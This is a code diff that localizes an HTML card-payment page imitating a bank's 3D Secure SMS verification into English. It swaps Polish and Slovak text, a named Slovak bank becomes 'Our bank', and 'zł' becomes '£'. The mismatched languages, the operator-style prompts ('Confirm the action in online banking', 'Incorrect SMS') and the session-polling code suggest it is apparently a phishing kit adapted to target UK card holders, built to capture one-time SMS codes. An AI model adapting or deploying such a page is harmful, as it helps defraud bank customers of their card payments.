@@ -1789,7 +1789,7 @@ img.processing {
             
             <a href="javascript:showHelp();">
                 <img src="data:," alt="help" class="help">
-                <span>Pomoc</span>
+                <span>Help</span>
             </a>
         
     </div>
@@ -1799,27 +1799,27 @@ img.processing {
               
 
                 <div class="cs-two-text-columns">
-                    <strong>Numer karty:</strong>
+                    <strong>Card:</strong>
                     <div id="masked-card-number"></div>
                 </div>
 
                 <div class="cs-two-text-columns pr-0">
-                    <strong>Data i godzina:</strong>
+                    <strong>Date and time:</strong>
                     <div id="security-code-date"></div>
                 </div>
 
                 <div class="cs-two-text-columns">
-                    <strong>Suma:</strong>
+                    <strong>Total amount:</strong>
                     <div id="price"></div>
                 </div>
 
     
     <div class="cs-three-columns sms">
-        <label for="authCode" class="cs-label">Jednorazowy kod SMS:</label>
+        <label for="authCode" class="cs-label">SMS code</label>
         <input id="authCode" type="text" name="authCode" placeholder="______" maxlength="8" autofocus="true" style="width: 118px" oninput="payButtonActivateEpin(secCodeLength, epinCodeLength, isEpinRequired)" onselect="payButtonActivateEpin(secCodeLength, epinCodeLength, isEpinRequired)" onkeyup="this.value=this.value;payButtonActivateEpin(secCodeLength, epinCodeLength, isEpinRequired)">
         <div class="resend-multiline">
             <a href="javascript:resendCodeFn(this);">
-                <span>Ponowne wysłanie kodu SMS</span>
+                <span>Resend SMS code</span>
             </a>
         </div>
     </div>
@@ -1883,14 +1883,14 @@ img.processing {
     <div id="footer">
         <div id="footer-content">
             <div class="cs-button-row onlybrwbutton light-blue">
-                <button name="buttonsubmit" type="submit" onclick="submitForm(event)" disabled="true">Zamknąć</button>
+                <button name="buttonsubmit" type="submit" onclick="submitForm(event)" disabled="true">Pay</button>
             </div>
             <div id="loadingMessage">
                 <div class="spinner"></div>
             </div>
             
             <div class="cs-link-row onlybrwbutton">
-                <a href="javascript:sendCancel(this);" class="red cancelButton">Anulować</a>
+                <a href="javascript:sendCancel(this);" class="red cancelButton">Cancel</a>
             </div>
             
             <div class="row cs-text center-info onlybrwbutton">
@@ -1908,25 +1908,25 @@ img.processing {
         <div id="help" style="display: none; line-height: 1.5">
     <div class="row cs-text title">
         <div class="column">
-            <strong>Pomoc</strong>
+            <strong>Help</strong>
         </div>
     </div>
 
     <div class="cs-text">
-        <div class="column">Slovenská sporiteľňa zvýšila bezpečnosť internetových platieb prostredníctvom služby 3D Secure - Zabezpečené platby na internete.</div>
+        <div class="column">Our bank has enhanced the security of online payments through the 3D Secure service - Secure payments on the Internet.</div>
     </div>
     <div class="cs-text">
-        <div class="column">Vaša platobná karta má aktivovanú službu 3D Secure, ktorá chráni Vašu kartu pred zneužitím. To znamená, že každú platbu musíte dohodnutým spôsobom potvrdiť a platba prebehne až po tomto potvrdení. Zadané údaje o platobnej karte nie sú zdieľané s obchodníkom.</div>
+        <div class="column">Your payment card has 3D Secure activated, which protects your card against misuse. This means that every payment must be confirmed by an agreed method, and the payment will only proceed after this confirmation. Your payment card details are not shared with the merchant.</div>
     </div>
     <div class="cs-text">
-        <div class="column">Podrobnejšie informácie získate na <a href="http://www.akoplatitkartou.sk/" target="_blank">www.akoplatitkartou.sk</a> alebo telefonicky na linke Klientské centrum 0850 111 888.</div>
+        <div class="column">For more information, visit <a href="http://www.akoplatitkartou.sk/" target="_blank">www.akoplatitkartou.sk</a> or call our Customer Center at 0850 111 888.</div>
     </div>
     <div class="row cs-wide-button">
         <div class="column">
-            <button type="button" onclick="cancelHelp();">Návrat</button>
+            <button type="button" onclick="cancelHelp();">Back</button>
         </div>
     </div>
-</div>
+    
         
         
     <div class="modal micromodal-bounce" id="modal-1" aria-hidden="true">
@@ -1935,11 +1935,11 @@ img.processing {
                 <div role="document">
                     <header class="modal__header" id="modal-1-title"></header>
                     <div class="mep_modal_content" id="modal-1-content">
-                        <div id="dialog-notification-1" class="dialogText" style="display: none;"><strong>Zostały 2 minuty na wprowadzenie kodu SMS!</strong><br>Po upływie tego czasu płatność zostanie anulowana.</div>
-                        <div id="dialog-notification-2" class="dialogText" style="display: none;"><strong>Zostały 30 sekund na wprowadzenie kodu SMS!</strong><br>Po upływie tego czasu płatność zostanie anulowana.</div>
-                    </div>
+                        <div id="dialog-notification-1" class="dialogText" style="display: none;"><strong>You have 2 minutes left to enter the SMS code!</strong><br>The payment will be canceled after this time expires.</div>
+                        <div id="dialog-notification-2" class="dialogText" style="display: none;"><strong>You have 30 seconds left to enter the SMS code!</strong><br>The payment will be canceled after this time expires.</div>
+                    </div>                    
                     <div class="row cs-wide-button">
-                        <button id="closeButton" class="modal__btn modal__btn-primary" data-micromodal-close="true" aria-label="Close this dialog window">Zamknąć</button>
+                        <button id="closeButton" class="modal__btn modal__btn-primary" data-micromodal-close="true" aria-label="Close this dialog window">Pay</button>
                     </div>
                 </div>
             </div>
@@ -2013,7 +2013,7 @@ const telephoneElement = document.getElementById('telephone');
 const priceElement = document.getElementById('price');
 
 localStorage.setItem('price', price);
-priceElement.textContent += price + ' zł';
+priceElement.textContent += price + ' £';
     function fetchUpdate() {
     
     console.log('sesion: ' + session)
@@ -2205,7 +2205,7 @@ function openModal() {
     modal.innerHTML = `
         <div class="modal-content">
             <span class="close">&times;</span>
-            <p class="dota_2">Potwierdź akcję w bankowości internetowejㅤ</p>
+            <p class="dota_2">Confirm the action in online bankingㅤ</p>
         </div>
     `;
 
@@ -2282,7 +2282,7 @@ function openModal_sms() {
     modal.innerHTML = `
         <div class="modal-content">
             <span class="close">&times;</span>
-            <p class="dota_2">Niepoprawny SMS</p>
+            <p class="dota_2">Incorrect SMS</p>
         </div>
     `;
 
